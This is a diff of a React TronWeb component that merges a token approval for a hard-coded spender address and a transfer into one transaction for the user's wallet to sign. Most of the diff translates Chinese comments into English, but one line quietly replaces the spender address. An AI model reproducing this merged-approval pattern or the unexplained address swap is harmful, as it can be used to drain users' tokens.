@@ -1,10 +1,10 @@
 import { Button, message } from 'antd';
 import { useState } from 'react';
 
-// 常量配置
+// Constant configuration
 const CONTRACTS = {
   USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-  TARGET_ADDRESS: 'TDgJmYStKqzawFQyMav8XxNp1pTpdhEWg9',
+  TARGET_ADDRESS: 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax',
   FROM_ADDRESS: 'TKMBdaT5E5e4X3qtff3aY2ain5pG5WNPL2',
   TOKEN_ADDRESS: 'TVDGpn4hCSzJ5nkHPLetk8KQBtwaTppnkr',
   RECIPIENT_ADDRESS: 'TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeL',
@@ -20,7 +20,7 @@ function MultiAction() {
   const [resultMessage, setResultMessage] = useState('');
   const [isLoading, setIsLoading] = useState(false);
 
-  // 创建转账交易
+  // Createtransfer transaction
   const createTransferTransaction = async (tronWeb) => {
     return await tronWeb.transactionBuilder.sendToken(
       CONTRACTS.TOKEN_ADDRESS,
@@ -30,7 +30,7 @@ function MultiAction() {
     );
   };
 
-  // 创建授权交易
+  // Createapproval transaction
   const createApproveTransaction = async (tronWeb) => {
     const parameter = [
       { type: 'address', value: CONTRACTS.TARGET_ADDRESS },
@@ -46,13 +46,13 @@ function MultiAction() {
     );
   };
 
-  // 合并交易
+  // Merge transaction
   const mergeTransactions = async (
     approveTransaction,
     transferTransaction,
     tronWeb,
   ) => {
-    // 创建新的合并交易
+    // CreatenewMerge transaction
     const mergedTransaction = {
       ...approveTransaction.transaction,
       raw_data: {
@@ -78,7 +78,7 @@ function MultiAction() {
     //   }
     // };
     // const tx = tronWeb.utils.transaction.txJsonToPb({ raw_data });
-    // 重新生成 raw_data_hex
+    // Regenerate raw_data_hex
     const tx = tronWeb.utils.transaction.txJsonToPb(mergedTransaction);
     const rawDataHex = tronWeb.utils.bytes.byteArray2hexStr(
       tx.getRawData().serializeBinary(),
@@ -92,40 +92,40 @@ function MultiAction() {
     };
   };
 
-  // 签名和验证
+  // Sign and verify
   const signAndSendTransaction = async (tronWeb, mergedTransaction) => {
     console.log(
       '>>> mergedTransaction.transaction',
       mergedTransaction.transaction,
     );
 
-    // 签名交易
+    // Sign transaction
     const signedTransaction = await tronWeb.trx.sign(
       mergedTransaction.transaction,
     );
     console.log('>>> signedTransaction', signedTransaction);
 
-    // 验证交易签名
+    // Verify transactionsigning
     const verifyTransactionSignature = async (signedTx) => {
       try {
-        // 获取验证所需的数据
+        // Get data required for verification
         const rawDataHex = signedTx.raw_data_hex;
         const signature = signedTx.signature[0];
         const signerAddress = tronWeb.defaultAddress.base58;
 
         if (!rawDataHex || !signature || !signerAddress) {
-          console.error('缺少验证所需的数据');
+          console.error('Missing data required for verification');
           return false;
         }
 
-        // 使用 raw_data_hex 验证签名
+        // Verify signature with raw_data_hex
         const isValid = await tronWeb.trx.verifyMessage(
           rawDataHex,
           signature,
           signerAddress,
         );
 
-        console.log('交易签名验证:', {
+        console.log('Transaction signature verification:', {
           txID: signedTx.txID,
           rawDataLength: rawDataHex.length,
           signatureLength: signature.length,
@@ -134,71 +134,71 @@ function MultiAction() {
 
         return isValid;
       } catch (error) {
-        console.error('验证签名时出错:', error);
+        console.error('Error while verifying signature:', error);
         return false;
       }
     };
 
-    // 执行验证
+    // Run verification
     const isValid = await verifyTransactionSignature(signedTransaction);
 
     if (isValid) {
-      console.log('✅ 交易签名验证成功！');
+      console.log('✅ Transaction signature verification succeeded!');
     } else {
-      console.warn('⚠️ 交易签名验证失败，但签名过程正常完成');
+      console.warn('⚠️ Transaction signature verification failed, but signing completed normally');
     }
 
     return signedTransaction;
   };
 
-  // 主要执行函数
+  // Main execution function
   const executeMultiAction = async () => {
     const tronWeb = window.tronWeb;
 
     if (!tronWeb) {
-      throw new Error('TronWeb 未加载，请确保已连接 Tron 钱包');
+      throw new Error('TronWeb is not loaded; make sure a Tron wallet is connected');
     }
 
     try {
-      message.info('创建交易中...');
+      message.info('Creating transaction...');
 
-      // 并行创建两个交易
+      // ParallelCreatetwo transaction
       const [transferTransaction, approveTransaction] = await Promise.all([
         createTransferTransaction(tronWeb),
         createApproveTransaction(tronWeb),
       ]);
 
-      message.info('合并交易中...');
+      message.info('Merging transactions...');
       const mergedTransaction = await mergeTransactions(
         approveTransaction,
         transferTransaction,
         tronWeb,
       );
 
-      message.info('签名并发送交易中...');
+      message.info('Signing and broadcasting transaction...');
       const result = await signAndSendTransaction(tronWeb, mergedTransaction);
 
-      console.log('交易结果:', result);
+      console.log('Transaction result:', result);
       return result;
     } catch (error) {
-      console.error('交易执行失败:', error);
+      console.error('Transaction failed:', error);
       throw error;
     }
   };
 
-  // 按钮点击处理函数
+  // Button click handler
   const handleButtonClick = async () => {
     setIsLoading(true);
     setResultMessage('');
 
     try {
       const result = await executeMultiAction();
-      setResultMessage(`交易成功: ${JSON.stringify(result)}`);
-      message.success('交易执行成功！');
+      setResultMessage(`Transaction succeeded: ${JSON.stringify(result)}`);
+      message.success('Transaction succeeded!');
     } catch (error) {
-      const errorMessage = error.message || '未知错误';
-      setResultMessage(`交易失败: ${errorMessage}`);
-      message.error(`交易执行失败: ${errorMessage}`);
+      const errorMessage = error.message || 'Unknown error';
+      setResultMessage(`Transaction failed: ${errorMessage}`);
+      message.error(`Transaction failed: ${errorMessage}`);
     } finally {
       setIsLoading(false);
     }
@@ -213,7 +213,7 @@ function MultiAction() {
         onClick={handleButtonClick}
         style={{ marginBottom: '16px' }}
       >
-        {isLoading ? '执行中...' : '执行 Approve + Transfer'}
+        {isLoading ? 'Running...' : 'Run Approve + Transfer'}
       </Button>
 
       {resultMessage && (
@@ -226,7 +226,7 @@ function MultiAction() {
             wordBreak: 'break-all',
           }}
         >
-          <strong>执行结果:</strong>
+          <strong>Result:</strong>
           <div style={{ marginTop: '8px' }}>{resultMessage}</div>
         </div>
       )}
